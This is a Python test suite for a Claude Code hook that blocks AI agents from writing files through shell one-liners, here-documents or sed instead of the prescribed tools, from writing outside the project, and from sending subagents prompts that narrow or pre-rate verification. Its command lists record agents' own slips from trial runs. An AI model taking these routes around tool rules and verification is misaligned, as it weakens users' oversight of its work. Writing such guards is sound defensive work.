#!/usr/bin/env python3
"""Tests for the cephalo guard: scripts/cephalo_guard.py, scripts/cephalo_guard.sh
and the hook command of templates/claude_settings.json.  Each case feeds the
hook JSON Claude Code sends (the shape recorded in live runs with CLI 2.1.283
and 2.1.301).

Usage, from the repository root: python3 -I .github/tests/test_cephalo_guard.py [-v]
(Python 3.9 or later; CI runs it on 3.9 and 3.13)
"""
import json
import re
import os
import shutil
import subprocess
import sys
import tempfile
import unicodedata
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
GUARD = ROOT / 'scripts' / 'cephalo_guard.py'
WRAPPER = ROOT / 'scripts' / 'cephalo_guard.sh'
SETTINGS = ROOT / 'templates' / 'claude_settings.json'
sys.path.insert(0, str(GUARD.parent))
import cephalo_guard as g  # noqa: E402

# temporary folders in a folder of their own, removed at exit
_TMP = tempfile.mkdtemp(prefix='cephalo-guard-tests-')
tempfile.tempdir = _TMP
import atexit  # noqa: E402
atexit.register(shutil.rmtree, _TMP, True)

POSIX_HOME = '/home/u'
POSIX_ROOT = '/home/u/proj'
WIN_HOME = 'C:\\Home\\u'
WIN_ROOT = 'C:\\Home\\u\\Projekt Arbeit'
STATE = tempfile.mkdtemp(prefix='guard-test-state-')


def env(plat='posix', root=None, has_py=None, state=None, on='', off=''):
    win = plat == 'windows'
    e = {'CEPHALO_GUARD_OS': plat,
         'CEPHALO_GUARD_HAS_PY': has_py if has_py is not None else ('1' if win else '0'),
         'HOME': WIN_HOME if win else POSIX_HOME, 'USERPROFILE': WIN_HOME if win else '',
         'CLAUDE_PROJECT_DIR': root or (WIN_ROOT if win else POSIX_ROOT),
         'CEPHALO_GUARD_STATE_DIR': state or STATE}
    if on:
        e['CEPHALO_GUARD_ON'] = on
    if off:
        e['CEPHALO_GUARD_OFF'] = off
    return e


def payload(tool, tool_input, event='PreToolUse', agent=None, cwd=None, session='sess-1', plat='posix'):
    cwd = cwd or (WIN_ROOT if plat == 'windows' else POSIX_ROOT)
    d = {'session_id': session,
         'transcript_path': '/home/u/.claude/projects/-home-u-proj/%s.jsonl' % session,
         'cwd': cwd, 'prompt_id': 'prompt-1', 'permission_mode': 'acceptEdits', 'effort': {'level': 'medium'},
         'hook_event_name': event, 'tool_name': tool, 'tool_input': tool_input, 'tool_use_id': 'toolu_01abc'}
    if agent:
        d['agent_id'] = 'a0123456789abcdef'
        d['agent_type'] = agent
    if event == 'PostToolUse':
        d['tool_response'] = {'type': 'create', 'filePath': tool_input.get('file_path', ''), 'content': ''}
        d['duration_ms'] = 7
    return d


def run(tool, tool_input, plat='posix', agent=None, event='PreToolUse', root=None, cwd=None, **kw):
    e = env(plat, root, **kw)
    return g.evaluate(payload(tool, tool_input, event, agent, cwd or root, plat=plat), e)


def bash(cmd, plat='posix', agent=None, root=None, cwd=None, **kw):
    return run('Bash', {'command': cmd, 'description': 'x'}, plat, agent, root=root, cwd=cwd, **kw)


def ps(cmd, plat='windows', **kw):
    return run('PowerShell', {'command': cmd, 'description': 'x'}, plat, **kw)


def check_shape(out):
    """Every answer of the guard has one of four exact shapes: a deny, a note to
    the model (additionalContext), a PostToolUse block, a note to the user.  An
    allow, ask or defer, updatedInput, continue/stopReason, suppressOutput or a
    legacy decision would skip or change Claude Code's own checks."""
    if out is None:
        return
    keys = set(out)
    if keys == {'hookSpecificOutput'}:
        hso = out['hookSpecificOutput']
        if hso.get('hookEventName') != 'PreToolUse':
            raise AssertionError('hookEventName: %r' % (out,))
        if set(hso) == {'hookEventName', 'permissionDecision', 'permissionDecisionReason'}:
            if hso['permissionDecision'] != 'deny':
                raise AssertionError('not a deny: %r' % (out,))
        elif set(hso) != {'hookEventName', 'additionalContext'}:
            raise AssertionError('hookSpecificOutput keys: %r' % (out,))
    elif keys == {'decision', 'reason'}:
        if out['decision'] != 'block':
            raise AssertionError('decision: %r' % (out,))
    elif keys != {'systemMessage'}:
        raise AssertionError('answer keys: %r' % (out,))


_evaluate = g.evaluate


def _checked_evaluate(*a, **k):
    out = _evaluate(*a, **k)
    check_shape(out)
    return out


g.evaluate = _checked_evaluate          # every call in these tests checks the answer's shape


def rules_of(out):
    hso = (out or {}).get('hookSpecificOutput') or {}
    if hso.get('permissionDecision') != 'deny':
        return set()
    import re
    return set(re.findall(r'cephalo guard (\w+):', hso['permissionDecisionReason']))


class Base(unittest.TestCase):
    def deny(self, out, rule):
        self.assertIsNotNone(out, 'expected a deny (%s), got nothing' % rule)
        hso = out.get('hookSpecificOutput') or {}
        self.assertEqual(hso.get('permissionDecision'), 'deny', out)
        self.assertEqual(hso.get('hookEventName'), 'PreToolUse')
        self.assertIn('cephalo guard %s' % rule, hso.get('permissionDecisionReason', ''))

    def passes(self, out):
        self.assertIsNone(out, out)


# ------------------------------------------------------------------ S1


class TestS1ShellWrites(Base):
    SLIPS = [
        # the trial runs' own slips (one-lined and multi-line forms)
        'cd "/home/u/proj" && py -c "\nimport re, pathlib\nfiles = [\'workspace/output/chapters/ch_1.md\']\n'
        'for f in files:\n    p = pathlib.Path(f)\n    t = p.read_text(encoding=\'utf-8\')\n'
        '    p.write_text(re.sub(r\'S\\. (?=\\d)\', \'S.\\u00A0\', t), encoding=\'utf-8\')\n"',
        "py -c \" import re p = 'workspace/output/verification/document_format_round_1.md' "
        "s = open(p, encoding='utf-8').read() s = s.replace('a', 'b') open(p, 'w', encoding='utf-8').write(s) \"",
        "py -c \"\nfrom docx import Document\ndoc = Document('workspace/output/reference.docx')\n"
        "doc.save('workspace/output/reference.docx')\n\"",
        'python3 -c "import json; json.dump({}, open(\'x.json\', \'w\'))"',
        "python -c \"from pathlib import Path; Path('workspace/state.md').open('a').write('x')\"",
        'py -3 -c "import pathlib; pathlib.Path(\'a.md\').write_bytes(b\'x\')"',
        # here-documents
        "cat <<'EOF' > workspace/output/verification/ch_1_round_1.md\n# Report\nEOF",
        "cat > workspace/output/verification/ch_1_round_1.md <<EOF\n# Report\nEOF",
        "cat <<-EOF >> workspace/state.md\n\t| row |\n\tEOF",
        "tee workspace/state.md <<'EOF'\ntext\nEOF",
        "cat <<'EOF' | tee workspace/output/chapters/ch_1.md\ntext\nEOF",
        "py - <<'EOF'\nfrom pathlib import Path\nPath('a.md').write_text('x')\nEOF",
        "python3 <<'EOF'\nopen('a.md', 'w').write('x')\nEOF",
        "cat <<'EOF' | py -\nopen('a.md', 'w').write('x')\nEOF",
        # echo / printf
        'echo "| a | b |" >> workspace/state.md',
        'printf "%s\\n" "text" > styleguide.md',
        'echo text 1> notes.md',
        'printf x | tee -a workspace/state.md > /dev/null',
        '(echo a; echo b) > f.md',
        '{ echo a; echo b; } > f.md',
        '{ echo a; ls; } > f.md',
        '( printf x; ls ) > f.md',
        'cat <<< "text" > f.md',
        # in-place editors and stream-editor rewrites
        "sed -i 's/S\\. /S.\\\\ /g' workspace/output/chapters/ch_1.md",
        "sed -Ei 's/a/b/' x.md",
        "sed --in-place 's/a/b/' x.md",
        "perl -pi -e 's/a/b/' x.md",
        "perl -0777 -i.bak -pe 's/a/b/' x.md",
        "awk -i inplace '{print}' x.md",
        "sed 's/a/b/' ch.md > ch.tmp && mv ch.tmp ch.md",
        "awk '{print}' ch.md > workspace/output/chapters/ch_1.md",
        'py -c "print(\'text\')" > workspace/state.md',
        # nested shells
        'bash -c "echo x > y.md"',
        'xargs sed -i "s/a/b/" < list.txt',
        "find workspace/output/chapters -name '*.md' -exec sed -i 's/a/b/' {} \\;",
    ]
    LEGIT = [
        # commands the definitions prescribe, as the trials ran them
        'mkdir -p workspace/output/verification && py scripts/verbatim_check.py workspace/output/chapters/ch_2.md '
        'workspace/sources/ workspace/state.md > workspace/output/verification/ch_2_round_1_verbatim.txt 2>&1; '
        'echo "EXIT:$?"',
        'python3 scripts/verbatim_check.py --words workspace/output/chapters/ch_1.md',
        'py scripts/build_reference_docx.py workspace/output/reference.docx \\\n  --font Arial --size 11',
        'pandoc workspace/output/title_page.md workspace/output/chapters/ch_1.md --reference-doc '
        'workspace/output/reference.docx -o workspace/output/document.docx',
        'pandoc workspace/output/document.docx --to plain --wrap=none > _scratch/format-verifier/plain.txt '
        '2>_scratch/format-verifier/err.txt; echo exit=$?',
        'pandoc --print-default-data-file reference.docx > _scratch/format-verifier/default_ref.docx',
        'bash scripts/docx_postprocess.sh workspace/output/document.docx; echo "exit=$?"',
        './scripts/docx_postprocess.sh workspace/output/document.docx',
        'py scripts/docx_pagination.py workspace/output/document.docx --front-matter roman',
        'bash scripts/extract_styleguide.sh workspace/sources/_guidelines/ 2>&1 | tail -15',
        'py -m pip install -r requirements.txt',
        'pip freeze > workspace/data/requirements_frozen.txt',
        'git add -A && git commit -m "$(cat <<\'EOF\'\nChapter 2 drafted\nEOF\n)"',
        'git diff --stat && git status --short',
        'git show HEAD:workspace/output/chapters/ch_1.md > _scratch/orchestrator/ch_1_prev.md',
        # read-only inline programs
        'python3 -c "import re,sys,zipfile; s=zipfile.ZipFile(sys.argv[1]).read(\'word/settings.xml\')'
        '.decode(\'utf-8\'); print(\'hyphenation flag: \' + (\'set\' if re.search(r\'<w:autoHyphenation\', s) '
        'else \'missing\'))" workspace/output/document.docx',
        "py -c \" from docx import Document d = Document('workspace/output/document.docx') "
        "for i, p in enumerate(d.paragraphs[:20]): print(i, repr(p.style.name)) \"",
        "py - <<'EOF'\nprint(open('workspace/state.md', encoding='utf-8').read().count('| '))\nEOF",
        'pandoc workspace/output/document.docx --to plain --wrap=none | py -c "import sys; print(len(sys.stdin.read()))"',
        # inline programs that write only in _scratch/
        "py -c \"import zipfile; zipfile.ZipFile('_scratch/orchestrator/x.zip', 'w').close()\"",
        'py -c "print(1)" > _scratch/orchestrator/out.txt',
        # stream editors to stdout or into _scratch/
        "sed -n '1,40p' workspace/output/chapters/ch_1.md",
        "sed 's/a/b/' ch.md > _scratch/orchestrator/ch.md",
        "awk '/^# 2 /,/^<!--/' ch.md | sed '/^<!--/d' | wc -w",
        'grep -n "S\\." ch.md | head -5 | cat -A',
        # echo for headings, to stderr or /dev/null
        'echo "--- state ---" && cat workspace/state.md',
        'echo "x" >&2', 'echo x > /dev/null', 'echo x 2>/dev/null',
        # copies
        'cat workspace/output/chapters/ch_1.md > _scratch/orchestrator/ch_1.md',
        'cp workspace/output/document.docx _scratch/format-verifier/document_noabbr.docx',
        'mkdir -p _scratch/orchestrator && cp ch.md _scratch/orchestrator/',
        'rm -rf _scratch/format-verifier && echo done',
        # text that only mentions the forbidden forms
        'grep -rn "py -c" .claude/agents/ | head',
        'grep -n "cat <<EOF" docs/x.md',
        'echo "a << b" | wc -c',
        "find workspace -name '*.md' -exec grep -l 'S\\.' {} +",
    ]

    def test_large_input_is_fast(self):
        import time
        big = "cat <<'EOF' > a.md\n" + ('Satz mit Zitat „x“ (vgl. Keller 2018, S. 44). ' * 4000) + '\nEOF'
        prompt = ('Prüfe das Kapitel gegen die Quellen nach source-verifier.md, Satz für Satz. ' * 800)
        t = time.perf_counter()
        self.assertIn('S1', rules_of(bash(big)))
        self.assertIsNone(run('Agent', {'prompt': prompt}, on='P1'))
        self.assertIsNone(bash('py -c "' + 'x = 1; ' * 20000 + '"'))
        self.assertLess(time.perf_counter() - t, 2.0)

    def test_slips_denied(self):
        for cmd in self.SLIPS:
            with self.subTest(cmd=cmd[:70]):
                self.assertIn('S1', rules_of(bash(cmd)), cmd)

    def test_slips_denied_on_windows_paths(self):
        out = bash('cd "%s" && py -c "import pathlib; pathlib.Path(\'ch.md\').write_text(\'x\')"' % WIN_ROOT,
                   plat='windows')
        self.deny(out, 'S1')

    def test_slips_denied_for_agents(self):
        out = bash(self.SLIPS[1], agent='format-verifier')
        self.deny(out, 'S1')
        reason = out['hookSpecificOutput']['permissionDecisionReason']
        self.assertIn('.claude/agents/format-verifier.md', reason)
        self.assertIn('with the Write tool', reason)

    def test_legit_pass(self):
        for cmd in self.LEGIT:
            with self.subTest(cmd=cmd[:70]):
                self.passes(bash(cmd))

    def test_legit_pass_on_windows(self):
        for cmd in self.LEGIT:
            if 'python3' in cmd:
                continue                    # S3 on Windows, tested below
            with self.subTest(cmd=cmd[:70]):
                self.passes(bash(cmd, plat='windows'))

    def test_message(self):
        out = bash(self.SLIPS[0])
        reason = out['hookSpecificOutput']['permissionDecisionReason']
        for part in ('not run', '.claude/agents/orchestrator.md', 'Principles', 'Edit or Write',
                     'S.\\ 12', 'ask the user', 'script file'):
            self.assertIn(part, reason)
        docx = bash(self.SLIPS[2])['hookSpecificOutput']['permissionDecisionReason']
        self.assertIn('build_reference_docx.py', docx)


class TestS1PowerShell(Base):
    def test_cmdlets_denied(self):
        for cmd in ('Set-Content -Path workspace/state.md -Value $t -Encoding utf8',
                    '$t | Out-File -Encoding utf8 workspace/output/chapters/ch_1.md',
                    'Add-Content workspace/state.md "| row |"',
                    'Get-Content ch.md | Tee-Object -FilePath x.md',
                    'New-Item -Path x.md -ItemType File -Value "text"',
                    '[System.IO.File]::WriteAllText("x.md", $t)',
                    'py -c "open(\'x.md\', \'w\').write(\'x\')"'):
            with self.subTest(cmd=cmd):
                self.assertIn('S1', rules_of(ps(cmd)))

    def test_read_only_pass(self):
        for cmd in ('Get-Content workspace/state.md | Select-String "Kapitel"',
                    'cd "%s"; py scripts/verbatim_check.py ch.md workspace/sources/ workspace/state.md' % WIN_ROOT,
                    'New-Item -ItemType Directory -Force _scratch/orchestrator',
                    'py --version'):
            with self.subTest(cmd=cmd):
                self.passes(ps(cmd))


# ------------------------------------------------------------------ S2


class TestS2Outside(Base):
    def test_shell_targets_denied(self):
        for cmd in ('pandoc workspace/output/document.docx --to plain --wrap=none > /tmp/doc_plain.txt 2>/dev/null',
                    'pandoc a.md -o "$TEMP/x.docx"', 'pandoc a.md --output=/tmp/x.docx', 'pandoc a.md -o/tmp/x.docx',
                    'mkdir -p /tmp/cephalo', 'cp ch.md ~/Desktop/', 'cp ch.md $HOME/backup/',
                    'py scripts/verbatim_check.py ch.md workspace/sources/ 2> /var/tmp/err.txt',
                    'cd /home/u/proj && py scripts/x.py > ../other.txt', 'touch /tmp/x',
                    'unzip -o guide.zip -d /tmp/guide', 'curl -o /tmp/x.pdf https://example.org/x.pdf',
                    'echo x | tee /tmp/notes.txt'):
            with self.subTest(cmd=cmd):
                self.assertIn('S2', rules_of(bash(cmd)), cmd)

    def test_shell_targets_inside_pass(self):
        for cmd in ('pandoc a.md -o workspace/output/document.docx', 'mkdir -p workspace/output/verification',
                    'cp ch.md /home/u/proj/_scratch/orchestrator/', 'cd /tmp && ls',
                    'cat /tmp/x.txt', 'py scripts/x.py > "$CLAUDE_PROJECT_DIR/_scratch/o/x.txt"'):
            with self.subTest(cmd=cmd):
                self.passes(bash(cmd))

    def test_windows_forms(self):
        cases = [('pandoc a.md -o /c/Temp/x.docx', True), ('pandoc a.md -o C:/Temp/x.docx', True),
                 ('pandoc a.md -o "C:\\Temp\\x.docx"', True), ('pandoc a.md -o "%TEMP%\\x.docx"', True),
                 ('pandoc a.md -o "/c/Home/u/Projekt Arbeit/workspace/output/x.docx"', False),
                 ('pandoc a.md -o "c:\\home\\U\\projekt arbeit\\workspace\\output\\x.docx"', False),
                 ('pandoc a.md -o /tmp/x.docx', True)]
        for cmd, outside in cases:
            with self.subTest(cmd=cmd):
                got = 'S2' in rules_of(bash(cmd, plat='windows'))
                self.assertEqual(got, outside, cmd)

    def test_write_tool(self):
        self.deny(run('Write', {'file_path': '/tmp/report.md', 'content': 'x'}), 'S2')
        self.deny(run('Edit', {'file_path': '/home/u/other/x.md', 'old_string': 'a', 'new_string': 'b'}), 'S2')
        self.deny(run('Write', {'file_path': 'D:\\Daten\\x.md', 'content': 'x'}, plat='windows'), 'S2')
        self.passes(run('Write', {'file_path': '/home/u/proj/workspace/state.md', 'content': 'x'}))
        self.passes(run('Write', {'file_path': 'c:/HOME/u/projekt arbeit/styleguide.md', 'content': 'x'},
                        plat='windows'))
        self.passes(run('Write', {'file_path': '/home/u/.claude/plans/plan.md', 'content': 'x'}))
        self.passes(run('Write', {'file_path': '/home/u/proj/workspace/x.md', 'content': 'x'}, agent='writer-agent'))

    def test_claude_folder(self):
        # the main chat and an orchestrator write plans, memory or a global CLAUDE.md the user asks for;
        # another agent only the agents' memory folder
        for f in ('/home/u/.claude/CLAUDE.md', '/home/u/.claude/projects/-home-u-proj/memory/MEMORY.md',
                  '/home/u/.claude/plans/plan.md'):
            with self.subTest(f=f):
                self.passes(run('Write', {'file_path': f, 'content': 'x'}))
                self.passes(run('Write', {'file_path': f, 'content': 'x'}, agent='orchestrator-longform'))
                self.deny(run('Write', {'file_path': f, 'content': 'x'}, agent='research-agent'), 'S2')
        self.passes(run('Write', {'file_path': '/home/u/.claude/agent-memory/research-agent/MEMORY.md',
                                  'content': 'x'}, agent='research-agent'))
        out = bash('cp _scratch/research-agent/a.md ~/.claude/agents/a.md', agent='research-agent')
        self.deny(out, 'S2')
        self.assertIn('~/.claude, which only the main chat writes', out['hookSpecificOutput']['permissionDecisionReason'])
        self.deny(run('Edit', {'file_path': 'C:\\Home\\u\\.claude\\skills\\x\\SKILL.md', 'old_string': 'a',
                               'new_string': 'b'}, plat='windows', agent='writer-agent'), 'S2')

    def test_scratchpad(self):
        d = payload('Write', {'file_path': '/tmp/claude-0/proj/sess/scratchpad/report.md', 'content': 'x'})
        d['scratchpad_dir'] = '/tmp/claude-0/proj/sess/scratchpad'
        out = g.evaluate(d, env())
        self.deny(out, 'S2')
        self.assertIn('scratchpad', out['hookSpecificOutput']['permissionDecisionReason'])

    def test_multi_project_shared_materials(self):
        top = tempfile.mkdtemp(prefix='guard-multi-')
        os.makedirs(os.path.join(top, '00_Shared_Materials'))
        sub = os.path.join(top, '02_Main_Work')
        os.makedirs(sub)
        e = env(root=sub)
        out = g.evaluate(payload('Write', {'file_path': os.path.join(top, '00_Shared_Materials', 'styleguide.md'),
                                           'content': 'x'}, cwd=sub), e)
        self.passes(out)
        out = g.evaluate(payload('Write', {'file_path': os.path.dirname(top) + '/elsewhere.md', 'content': 'x'},
                                 cwd=sub), e)
        self.deny(out, 'S2')
        shutil.rmtree(top)

    def test_macos_unicode_form(self):
        # macOS: a folder named in Finder is decomposed (NFD), a typed path precomposed (NFC): both name the
        # project folder
        nfd, nfc = (unicodedata.normalize(f, '/Users/u/Masterarbeit Übung') for f in ('NFD', 'NFC'))
        self.assertNotEqual(nfd, nfc)
        for root, path in ((nfd, nfc), (nfc, nfd)):
            f = path + '/workspace/output/chapters/01_Einleitung.md'
            with self.subTest(root=ascii(root), path=ascii(path)):
                self.passes(run('Write', {'file_path': f, 'content': 'x'}, plat='macos', root=root))
                self.passes(run('Edit', {'file_path': f, 'old_string': 'a', 'new_string': 'b'}, plat='macos', root=root))
                for cmd in ('cat > "%s"' % f, 'pandoc ch.md -o "%s/workspace/output/document.docx"' % path,
                            'mkdir -p "%s/workspace/output/verification"' % path,
                            'sed s/a/b/ ch.md > "%s/_scratch/orchestrator/x.md"' % path,
                            'python3 "%s/scripts/build_reference_docx.py" a.docx b.docx' % path):
                    self.passes(bash(cmd, plat='macos', root=root))
                self.deny(run('Write', {'file_path': '/tmp/x.md', 'content': 'x'}, plat='macos', root=root), 'S2')
                self.deny(run('Write', {'file_path': path + ' 2/x.md', 'content': 'x'}, plat='macos', root=root), 'S2')
        # Linux and Windows (NTFS) keep the two forms apart: such a write makes a second folder
        for plat, root, path in (('posix', nfd, nfc), ('posix', nfc, nfd), ('windows', 'C:' + nfd, 'C:' + nfc)):
            with self.subTest(plat=plat, root=ascii(root)):
                self.deny(run('Write', {'file_path': path + '/workspace/x.md', 'content': 'x'}, plat=plat, root=root),
                          'S2')
        self.deny(run('Write', {'file_path': '/home/u/Proj/x.md', 'content': 'x'}), 'S2')    # Linux: case counts


# ------------------------------------------------------------------ S3, S4


class TestS3Python(Base):
    def test_or_rerun_denied_everywhere(self):
        cmd = ('python3 scripts/verbatim_check.py --words ch.md 2>&1 || '
               'py scripts/verbatim_check.py --words ch.md 2>&1')
        self.deny(bash(cmd), 'S3')
        self.deny(bash(cmd, plat='windows'), 'S3')
        self.deny(bash('py scripts/bibliography_check.py d.docx || python3 scripts/bibliography_check.py d.docx'),
                  'S3')

    def test_probes_pass(self):
        for cmd in ('(py --version 2>&1 || python3 --version 2>&1 || python --version 2>&1)',
                    'python3 --version', 'command -v python3 || echo none', 'py scripts/x.py || echo failed'):
            with self.subTest(cmd=cmd):
                self.passes(bash(cmd, plat='windows'))

    def test_python3_on_windows(self):
        self.deny(bash('python3 scripts/bibliography_check.py workspace/output/document.docx; echo "exit=$?"',
                       plat='windows'), 'S3')
        self.passes(bash('python3 scripts/bibliography_check.py d.docx', plat='windows', has_py='0'))
        self.passes(bash('python3 scripts/bibliography_check.py d.docx', plat='posix'))
        self.passes(bash('py scripts/bibliography_check.py d.docx', plat='windows'))


class TestS4PowerShellRedirect(Base):
    def test_redirect_denied(self):
        self.deny(ps('py scripts/verbatim_check.py ch.md workspace/sources/ > workspace/output/verification/'
                     'ch_round_1_verbatim.txt'), 'S4')
        self.deny(ps('py scripts/x.py *> out.txt'), 'S4')

    def test_others_pass(self):
        for cmd in ('py scripts/verbatim_check.py ch.md workspace/sources/ 2>$null',
                    'py scripts/x.py 2>&1', 'py -c "print(1>0)"', 'Get-ChildItem | Where-Object { $_.Length -gt 0 }'):
            with self.subTest(cmd=cmd):
                self.passes(ps(cmd))


# ------------------------------------------------------------------ R6, R5


class TestReports(Base):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix='guard-proj-')
        self.ver = os.path.join(self.root, 'workspace', 'output', 'verification')
        os.makedirs(self.ver)

    def tearDown(self):
        shutil.rmtree(self.root)

    def test_r6_format_report(self):
        rep = os.path.join(self.ver, 'document_format_round_1.md')
        self.passes(run('Write', {'file_path': rep, 'content': 'x'}, root=self.root))     # fallback: absent
        Path(rep).write_text('report', encoding='utf-8')
        self.deny(run('Write', {'file_path': rep, 'content': 'x'}, root=self.root), 'R6')
        self.deny(run('Edit', {'file_path': rep, 'old_string': '20', 'new_string': '23'}, root=self.root), 'R6')
        self.passes(run('Write', {'file_path': rep, 'content': 'x'}, root=self.root, agent='format-verifier'))
        lf = os.path.join(self.root, '08_Formal_Review', 'format_reports', 'round_2.md')
        self.deny(run('Edit', {'file_path': lf, 'old_string': 'a', 'new_string': 'b'}, root=self.root), 'R6')
        out = run('Edit', {'file_path': lf, 'old_string': 'a', 'new_string': 'b'}, root=self.root,
                  agent='orchestrator-longform')
        self.deny(out, 'R6')
        self.assertIn('orchestrator-longform.md', out['hookSpecificOutput']['permissionDecisionReason'])

    def test_r5_readback(self):
        rep = os.path.join(self.ver, 'ch_1_einleitung_round_1.md')
        text = ('# Verification\n| # | Satz | Status |\n|---|---|---|\n| 1 | \u201eZitat\u201c | \u2705 |\n'
                '\n**Status:** \u2705\n- Status: \u26a0\ufe0f Seite fehlt\nGesamt: 1 \u2705\n\n')
        Path(rep).write_text(text, encoding='utf-8')
        out = run('Write', {'file_path': rep, 'content': text}, event='PostToolUse', root=self.root)
        self.assertEqual(out['decision'], 'block')
        r = out['reason']
        for part in ('R5', 'workspace/output/verification/ch_1_einleitung_round_1.md', 'Read tool',
                     'no offset or limit', '3 table rows', '2 lines with "Status:"',
                     'quotation marks: 1 \u201e, 1 \u201c;', '\u00abGesamt: 1 \u2705\u00bb'):
            self.assertIn(part, r)
        self.assertNotIn('still contains an absolute path', r)
        self.assertNotIn('not closed by', r)
        # the copy closed the German quotation marks with ASCII quotes, as in the fourth seminar run
        Path(rep).write_text(text.replace('\u201c', '"'), encoding='utf-8')
        r = run('Write', {'file_path': rep, 'content': 'x'}, event='PostToolUse', root=self.root)['reason']
        self.assertIn('quotation marks: 1 \u201e, 1 ";', r)
        self.assertIn('1 \u201e in it is not closed by \u201c (the next quotation mark after it)', r)
        # German and English quotations in one report: only a lost German closing mark warns, each
        # opening mark paired with the next quotation mark; a stray \u201d or a pair of \u201d warns not
        mixed = text + 'Ein \u201eZitat\u201c und ein \u201cquote\u201d.\n'
        for saved, warns in ((mixed, False), (mixed.replace('\u201c', '"'), True),
                             (mixed.replace('\u201eZitat\u201c', '\u201eZitat"'), True),
                             (mixed.replace('\u201eZitat\u201c', '\u201eZitat\u201d'), True),
                             (text + 'Ein Bildschirm, 12\u201d breit.\n', False),
                             (text.replace('\u201e', '').replace('\u201c', '') + 'Ein quote\u201d.\n', False),
                             (text + 'Han sa \u201dja\u201d.\n', False),
                             (text + '\u201eeins\u201c \u201ezwei\u201c \u201edrei\u201d\n', True),
                             (text + '| 2 | \u201eEr nannte es "Plan B".\u201c | ok |\n', False),
                             (text + '\u201eZitat" und \u201cquote\u201d\n', True),
                             (text + '\u201eA "B" "C\u201c\n', True)):
            with self.subTest(saved=ascii(saved[-40:])):
                Path(rep).write_text(saved, encoding='utf-8')
                r = run('Write', {'file_path': rep, 'content': 'x'}, event='PostToolUse', root=self.root)['reason']
                self.assertEqual('not closed by \u201c' in r, warns, r)
        Path(rep).write_text(text.replace('\u201c', '"') + '\u201eB" \u201eC"\n', encoding='utf-8')
        r = run('Write', {'file_path': rep, 'content': 'x'}, event='PostToolUse', root=self.root)['reason']
        self.assertIn('3 \u201e in it are not closed by \u201c', r)
        Path(rep).write_text(text.replace('\u201e', '').replace('\u201c', ''), encoding='utf-8')
        r = run('Write', {'file_path': rep, 'content': 'x'}, event='PostToolUse', root=self.root)['reason']
        self.assertIn('quotation marks: none;', r)
        Path(rep).write_text(text + 'Quelle: %s/workspace/sources/a.pdf\n' % self.root, encoding='utf-8')
        out = run('Write', {'file_path': rep, 'content': 'x'}, event='PostToolUse', root=self.root)
        self.assertIn('still contains an absolute path', out['reason'])

    def test_r5_only_reports_by_the_coordinator(self):
        for name in ('ch_1_round_2_verbatim.txt', 'ch_1_threeway_round_1.md', 'consistency_final.md',
                     'document_format_round_1.md', 'notes.md'):
            p = os.path.join(self.ver, name)
            Path(p).write_text('| a |\n', encoding='utf-8')
            out = run('Write', {'file_path': p, 'content': 'x'}, event='PostToolUse', root=self.root)
            with self.subTest(name=name):
                self.assertEqual(bool(out), name not in ('ch_1_round_2_verbatim.txt', 'notes.md'))
        p = os.path.join(self.ver, 'document_format_round_1.md')
        self.passes(run('Write', {'file_path': p, 'content': 'x'}, event='PostToolUse', root=self.root,
                        agent='format-verifier'))
        p = os.path.join(self.root, 'workspace', 'output', 'chapters', 'ch_1.md')
        self.passes(run('Write', {'file_path': p, 'content': 'x'}, event='PostToolUse', root=self.root))
        self.passes(run('Edit', {'file_path': os.path.join(self.ver, 'ch_1_round_1.md'), 'old_string': 'a',
                                 'new_string': 'b'}, event='PostToolUse', root=self.root))


# ------------------------------------------------------------------ P1


class TestP1TaskPrompts(Base):
    def state(self):
        return tempfile.mkdtemp(prefix='guard-p1-')

    def agent(self, prompt, st, subagent='source-verifier', session='sess-p1'):
        d = payload('Agent', {'description': 'Kapitel 1 Runde 2', 'prompt': prompt, 'subagent_type': subagent},
                    session=session)
        return g.evaluate(d, env(state=st, on='P1'))

    def test_hits_denied_once(self):
        st = self.state()
        prompt = ('Verifiziere Kapitel 1 Runde 2. Die Sätze 1, 3 und 4 sind unverändert und müssen nicht erneut '
                  'geprüft werden. Prüfe nur Satz 2.')
        out = self.agent(prompt, st)
        self.deny(out, 'P1')
        reason = out['hookSpecificOutput']['permissionDecisionReason']
        for part in ('not sent', 'leave out', 'narrows', '"Task prompts"', 'send the same prompt again',
                     'the user asked for exactly this'):
            self.assertIn(part, reason)
        self.passes(self.agent(prompt, st))                         # identical resend passes
        self.deny(self.agent(prompt + ' ', st), 'P1')               # a changed prompt is checked again
        self.deny(self.agent(prompt, st, session='other'), 'P1')    # per session

    def test_phrases(self):
        cases = [
            ('Please re-verify just the three changed sentences against their originals.', 'only'),
            ('There is one logged, non-blocking situation you do not need to flag again.', 'skip'),
            ('Hinweise zu Dingen, die ich schon separat geprüft habe: sie sollten grün sein.', 'pre-rate'),
            ('Do not flag it again as new, just confirm it is still the known, expected placeholder state.', 'skip'),
            ('The underlying quotes were already confirmed accurate for Chapter 2.', 'presuppose'),
            ('Laut Decision Log ist die Seitenzahl festgelegt.', 'presuppose'),
            ('Der Nutzer hat die Variante bestätigt.', 'presuppose'),
            ('Ändere NUR Satz 2, der Rest des Kapitels bleibt unverändert.', 'change-only'),
            ('Überarbeite den Satz, aber ändere nicht die Registry.', 'keep-files'),
            ('This fixes finding 3.', 'pre-rate'),
        ]
        for text, kind in cases:
            with self.subTest(text=text):
                found = [k for k, _ in g.p1_findings(text)]
                self.assertIn(kind, found)

    def test_clean_prompts_pass(self):
        st = self.state()
        for prompt in (
            'Verifiziere workspace/output/chapters/ch_1.md Runde 2 nach source-verifier.md. Vorheriger Bericht: '
            'workspace/output/verification/ch_1_round_1.md. Geändert hat die Revision die Sätze 2 und 4.',
            'Ändere nur, was die Befunde betreffen: Kapiteldatei ch_1.md und die Zeilen deines Kapitels im '
            'Quellenregister von workspace/state.md.',
            'Run the cross-chapter and whole-document check only, not a re-verification of single sentences.',
            'Ergänze Quellen, die noch nicht in der Registry stehen, nach demselben Muster.',
        ):
            with self.subTest(prompt=prompt[:50]):
                self.passes(self.agent(prompt, st, subagent='writer-agent'))

    def test_send_message(self):
        st = self.state()
        d = payload('SendMessage', {'to': 'a8', 'summary': 'Runde 3', 'message': 'Prüfe nur diesen Teilsatz.',
                                    'type': 'message', 'recipient': 'a8', 'recipient_kind': 'agent',
                                    'content': 'Prüfe nur…'})
        self.deny(g.evaluate(d, env(state=st, on='P1')), 'P1')
        d = payload('SendMessage', {'to': 'a8', 'message': {'type': 'shutdown_request'}})
        self.passes(g.evaluate(d, env(state=st, on='P1')))
